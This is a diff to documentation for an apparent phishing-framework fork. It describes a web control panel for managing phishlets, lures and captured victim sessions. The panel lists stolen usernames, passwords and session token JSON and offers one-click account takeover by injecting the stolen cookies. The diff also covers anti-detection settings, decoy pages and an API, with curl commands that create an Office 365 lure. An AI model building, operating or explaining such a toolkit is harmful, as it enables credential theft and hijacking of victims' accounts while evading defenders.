@@ -475,58 +475,71 @@ autolures delete 0
 
 ---
 
-# PART 12: WEB DASHBOARD
+# PART 12: CONTROL PANEL
 
-## Access via port
+The fork ships a full web control panel — a clean, minimalist single-page app that
+drives **every** feature from the browser. It is served on the dashboard port and,
+optionally, on an HTTPS subdomain.
 
-```
+## Access
+
+```bash
+# over the panel port (plain HTTP)
 http://YOUR_VPS_IP:5000
+
+# or over HTTPS with the wildcard cert (recommended)
+config dashboardsub panel      # -> https://panel.yoursite.com
 ```
 
-Login with the credentials you set (`-dashboard-user` / `-dashboard-pass`).
+Sign in with `-dashboard-user` / `-dashboard-pass`. The first visit lands on a
+login page; a session token is stored in an HttpOnly cookie. HTTP Basic auth is
+also accepted (handy for `curl`), and a `Bearer <token>` header works too.
 
-## Access via HTTPS subdomain (recommended)
+If both username and password are empty, auth is disabled entirely — always set
+at least a password on a public VPS.
 
-Assign the dashboard to a subdomain of your config domain so it's accessible over HTTPS with your wildcard cert:
+## Pages
 
-```
-config dashboardsub panel
-```
-
-This makes the dashboard available at `https://panel.yoursite.com`. The wildcard cert covers it automatically — no extra cert needed.
-
-To unassign, set it to empty:
-
-```
-config dashboardsub ""
-```
+| Page | What it does |
+|------|--------------|
+| **Overview** | Live stats (sessions, tokens, capture rate, unique IPs, active sessions), a 14-day capture sparkline, top phishlets, top countries, recent captures |
+| **Sessions** | Searchable / filterable / sortable capture table; row drawer with credentials, GeoIP + user-agent, full token JSON; one-click takeover; CSV/JSON export; bulk and full clear |
+| **Phishlets** | Per-phishlet cards — enable / disable, hide / unhide, set hostname, per-phishlet `unauth_url`, reload from disk, view raw YAML, copy DNS records; reload-all |
+| **Lures** | Create (optionally with encrypted URL params), edit every field (path, hostname, redirect, UA filter, active hours/days/tz, OG tags), clone, pause/resume, delete, copy the shareable link |
+| **Autolures** | Create self-rotating lures with a fixed or random interval; live countdown to next rotation; Telegram notify toggle; delete |
+| **Redirects** | Manage decoy landing pages — add/remove subdomain → HTML file mappings, optional Turnstile gate, pick from the files present in the redirects dir |
+| **Blacklist** | Switch mode (off / unauth / noadd / all), add and remove IPs, see counts |
+| **Settings** | General, Anti-detection, Integrations, Dashboard and outbound-proxy settings with inline editing; Telegram & GoPhish connection tests; Turnstile keys; certificate re-provisioning |
+| **System** | Version/uptime, domain, cert subject + expiry, posture flags, and the DNS records to point at the server |
 
 ## Live credential updates
-
-To change dashboard login credentials without restarting:
 
 ```
 config dashboard-user newuser
 config dashboard-pass newpassword
 ```
 
-Changes take effect immediately — the next login attempt will require the new credentials.
+Changes apply immediately to both the terminal and the panel.
 
-## Dashboard features
+## Extension bridge
 
-- **Swipe Panel ⚡ sidebar** — fixed left sidebar with quick-filter nav (All / With Tokens / No Tokens with live counts), dynamic phishlet list, and a social link placeholder at the bottom you can update later
-- Six compact stats cards: Total, Tokens, No Tokens, Unique IPs, Phishlets, Last Capture
-- Session table: ID, phishlet, username, password, IP, token status, timestamp
-- Click any row to expand the detail panel: credentials, GeoIP, user-agent, full token JSON
-- **Inject Session** button — appears in the detail panel when tokens are present. Opens a takeover modal with two paths:
-  - **With the Session Injector extension (recommended):** one-click — cookies are injected directly into your browser (including HttpOnly cookies) and the target site opens in a new tab already logged in. See **Part 12a** below for install steps.
-  - **Without extension (fallback):** downloads cookies as Cookie-Editor JSON; click "Open Target Site", import via Cookie-Editor, reload
-  - **Curl / Burp:** click "Copy Cookie Header" to copy a ready-to-paste `Cookie: name=val; ...` string
-- Search by username, password, IP, user-agent, phishlet
-- Bulk select and delete
-- Export to CSV or JSON
-- Dark/light mode toggle
-- Auto-refresh every 10 seconds
+The panel keeps the `data-app="ctrl-panel"` marker and the `postMessage`
+protocol (`DO_INJECT`, `SESSION_SELECT`, `inject-result`) used by the Session
+Injector extension, and exposes the same `/api/cookies`-style export shape — so
+**Part 12a** keeps working unchanged.
+
+## API
+
+Everything is a small JSON API under `/api/v1/` (sessions, phishlets, lures,
+autolures, redirects, blacklist, config, system, integrations). Legacy
+`/api/sessions*` and `/api/cookies/*` endpoints are kept for older tooling.
+
+```bash
+curl -u admin:PASS http://YOUR_VPS_IP:5000/api/v1/overview
+curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
+  -d '{"phishlet":"o365new","subdomain":"login"}' \
+  http://YOUR_VPS_IP:5000/api/v1/lures
+```
 
 ---
 
